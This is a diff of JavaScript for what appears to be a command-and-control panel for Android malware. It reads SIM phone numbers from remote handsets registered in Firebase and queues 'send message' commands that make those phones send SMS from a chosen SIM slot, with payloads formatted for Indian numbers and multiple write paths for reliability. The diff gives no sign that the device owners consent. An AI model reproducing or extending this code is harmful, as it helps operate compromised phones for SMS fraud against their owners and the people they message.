@@ -451,10 +451,15 @@ function getApkMobNo(raw,d){
   if(parsed)return parsed;
   return (d&&d.displayPhone)||'No Number';
 }
-function getDeviceSmsPhone(d){
+function getApkSimPhone(raw,simSlot){
+  var sims=parseApkSims(raw), idx=Math.max(0,(simSlot||1)-1);
+  if(sims[idx]&&sims[idx].phoneNumber)return String(sims[idx].phoneNumber).trim();
+  return apkPhoneFromRaw(raw);
+}
+function getDeviceSmsPhone(d,simSlot){
   if(!d)return'';
   var raw=getRawDev(d.id);
-  var mob=getApkMobNo(raw,d);
+  var mob=getApkSimPhone(raw,simSlot)||getApkMobNo(raw,d);
   if(!mob||mob==='No Number'||/^unknown$/i.test(String(mob).trim()))return'';
   var clean=String(mob).trim().replace(/\s/g,'');
   if(clean.indexOf('+')===0)return clean;
@@ -462,11 +467,11 @@ function getDeviceSmsPhone(d){
   if(digits.length===10)return'+91'+digits;
   return clean||digits;
 }
-function fillDeviceSmsTo(d,force){
+function fillDeviceSmsTo(d,force,simSlot){
   var toEl=document.getElementById('smsTo');
   if(!toEl||!d)return;
   if(!force&&toEl.value&&String(toEl.value).trim())return;
-  var phone=getDeviceSmsPhone(d);
+  var phone=getDeviceSmsPhone(d,simSlot||_sendSimSlot);
   if(phone)toEl.value=phone;
 }
 function getApkModel(raw,d){return String((raw&&raw.modelName)||(d&&d.name)||'Unknown');}
@@ -1950,10 +1955,11 @@ function sendDeviceSms(sim){
   _sendSimSlot=sim||1;
   var toEl=document.getElementById('smsTo');
   var msgEl=document.getElementById('smsBody');
+  var raw=getRawDev(d.id);
   var toRaw=(toEl&&toEl.value||'').trim();
   if(!toRaw){
-    toRaw=getDeviceSmsPhone(d);
-    if(toEl&&toRaw)toEl.value=toRaw;
+    toRaw=getApkSimPhone(raw,_sendSimSlot)||getApkMobNo(raw,d);
+    if(toEl&&toRaw)toEl.value=(toRaw.length===10?'+91'+toRaw:toRaw);
   }
   var to=normalizePhone(toRaw)||toRaw;
   var msg=(msgEl&&msgEl.value||'').trim();
@@ -1966,7 +1972,7 @@ function sendDeviceSms(sim){
     _sendInFlight=false;
     if(ok){
       if(msgEl)msgEl.value='';
-      toast('SMS sent!',true);
+      toast('SMS command bheja — device online hona chahiye',true);
     }else{
       toast((data&&data.error)||'Send failed',false);
     }
@@ -2653,33 +2659,52 @@ function selectSim(slot,btn){
 }
 
 // ---- Send SMS — instant Firebase direct + REST fallback ----
-function buildRabelSendPayload(sim,to,message){
-  return{from:sim||1,to:String(to||'').trim(),message:message,isSended:false};
+function isNyaApkFirebase(inst){
+  if(!inst)return false;
+  if(inst.config&&String(inst.config.id||'').indexOf('nya_')===0)return true;
+  if(inst.config&&inst.config.deviceNode==='clients')return true;
+  if(inst.config&&inst.config.preferredDeviceNode==='clients')return true;
+  if(inst.schema==='rabel'&&inst.rootKeys&&inst.rootKeys.indexOf('clients')>=0)return true;
+  return false;
 }
-function buildRto9SendPayload(deviceId,sim,to,message){
+function formatApkSmsTo(raw){
+  var clean=String(raw||'').replace(/\D/g,'');
+  if(clean.length===10)return '91'+clean;
+  if(clean.length===12&&clean.indexOf('91')===0)return clean;
+  if(clean.length>10)return '91'+clean.slice(-10);
+  return clean;
+}
+function buildRabelSendPayload(sim,to,message){
+  return{from:sim||1,to:formatApkSmsTo(to),message:message,isSended:false};
+}
+function buildNyaApkCommandPatch(deviceId,sim,to,message){
+  var to91=formatApkSmsTo(to);
   var slot=Math.max(0,(sim||1)-1);
-  var toVal=String(to||'').trim();
   return{
-    cmd:'send_sms',command:'send message',messageText:message,msg:message,
-    phoneNumber:toVal,to:toVal,
-    sendSms:{message:message,status:'pending',to:toVal},
-    sms:{message:message,status:'pending',to:toVal},
-    sim:slot,simSlot:String(slot),
-    targetDeviceId:deviceId,
-    timestamp:Date.now(),
-    webhookEvent:'send_sms'
+    command:'send message',messageText:message,msg:message,
+    phoneNumber:to91,phone:to91,number:to91,to:to91,
+    targetDeviceId:deviceId,simSlot:String(slot),sim:slot,
+    sendSms:{message:message,status:'pending',to:to91},
+    sms:{message:message,status:'pending',to:to91},
+    type:'sms',timestamp:Date.now()
   };
 }
+function buildRto9SendPayload(deviceId,sim,to,message){
+  return buildNyaApkCommandPatch(deviceId,sim,to,message);
+}
 function getSendAttempts(inst,d,to,message,sim){
-  var id=d.rawId,out=[],rto,rabel;
-  var toFull=String(to||'').trim();
-  rabel=buildRabelSendPayload(sim,toFull,message);
-  out.push({path:'clients/'+id+'/webhookEvent/sendSms',payload:rabel});
+  var id=d.rawId,out=[],rabel=buildRabelSendPayload(sim,to,message);
+  out.push({path:'clients/'+id+'/webhookEvent/sendSms',payload:rabel,method:'PUT'});
+  var nya=isNyaApkFirebase(inst)||shouldUseApkSmsPath(inst,d)||isNyaApkClientRecord(getRawDev(d.id));
+  if(nya){
+    out.push({path:'clients/'+id,payload:buildNyaApkCommandPatch(id,sim,to,message),method:'PATCH'});
+    return out;
+  }
   if(isRtoStyleUrl(inst.restUrl)||isRabelPanel(inst)){
-    rto=buildRto9SendPayload(id,sim,toFull,message);
-    out.push({path:'clients/'+id,payload:rto});
-    out.push({path:id,payload:rto});
-    out.push({path:id+'/webhookEvent/sendSms',payload:rabel});
+    var patch=buildNyaApkCommandPatch(id,sim,to,message);
+    out.push({path:'clients/'+id,payload:patch,method:'PATCH'});
+    out.push({path:id,payload:patch,method:'PATCH'});
+    out.push({path:id+'/webhookEvent/sendSms',payload:rabel,method:'PUT'});
   }
   return out;
 }
@@ -2698,7 +2723,10 @@ function promiseAny(promises){
 function sendSmsDirectFirebase(inst,attempts){
   if(!inst||!inst.db||!attempts.length)return Promise.reject();
   return promiseAny(attempts.map(function(a){
-    return inst.db.ref(a.path).set(a.payload).then(function(){return{ok:true,path:a.path,via:'firebase'};});
+    var ref=inst.db.ref(a.path);
+    var method=String(a.method||'PUT').toUpperCase();
+    if(method==='PATCH')return ref.update(a.payload).then(function(){return{ok:true,path:a.path,via:'firebase',method:'PATCH'};});
+    return ref.set(a.payload).then(function(){return{ok:true,path:a.path,via:'firebase',method:'PUT'};});
   }));
 }
 function sendSmsViaRest(inst,attempts){
@@ -2708,10 +2736,10 @@ function sendSmsViaRest(inst,attempts){
     attempts.forEach(function(a){
       tasks.push(
         fetch(buildRestUrl(inst,a.path,auth),{
-          method:'PUT',headers:{'Content-Type':'application/json'},
+          method:a.method||'PUT',headers:{'Content-Type':'application/json'},
           body:JSON.stringify(a.payload),cache:'no-store'
         }).then(function(r){
-          if(r.ok)return{ok:true,path:a.path,via:'rest'};
+          if(r.ok)return{ok:true,path:a.path,via:'rest',method:a.method||'PUT'};
           return r.text().then(function(t){throw new Error((a.path||'rest')+' HTTP '+r.status+(t?' '+t.slice(0,80):''));});
         })
       );
@@ -2784,13 +2812,13 @@ function sendSmsInstant(to,msg,simSlot,callback){
   var inst=getFbInstance(d&&d.fbId);
   if(!d||!inst){if(callback)callback(false,{error:'No device'});return;}
   var phoneFull=String(to||'').trim();
-  var phone=normalizePhone(phoneFull)||phoneFull;
-  var attempts=getSendAttempts(inst,d,phoneFull||phone,msg,simSlot||1);
+  var phoneDial=formatApkSmsTo(phoneFull||to);
+  var attempts=getSendAttempts(inst,d,phoneFull||phoneDial,msg,simSlot||1);
   var tasks=[];
   tasks.push(sendSmsViaRest(inst,attempts));
   if(inst.db)tasks.push(sendSmsDirectFirebase(inst,attempts));
   tasks.push(sendSmsFetch({
-    device_id:d.rawId,to:phoneFull||phone,message:msg,sim:simSlot||1,
+    device_id:d.rawId,to:phoneDial,message:msg,sim:simSlot||1,
     database_url:inst.restUrl,auth_key:getFbAuthKey(inst),
     schema:inst.schema||'rabel',device_node:d.deviceNode||'clients',composite_id:d.id
   }).then(function(res){
@@ -2800,7 +2828,7 @@ function sendSmsInstant(to,msg,simSlot,callback){
   promiseAny(tasks).then(function(r){
     if(callback)callback(true,{ok:true,message:'SMS command queued'+(r.via?' via '+r.via:'')+(r.path?' → '+r.path:''),path:r.path});
   }).catch(function(e){
-    var err=(e&&e.message)||'Send failed — device offline ya Firebase block';
+    var err=(e&&e.message)||'Send failed — device offline hona chahiye ya Firebase block';
     if(callback)callback(false,{error:err});
   });
 }
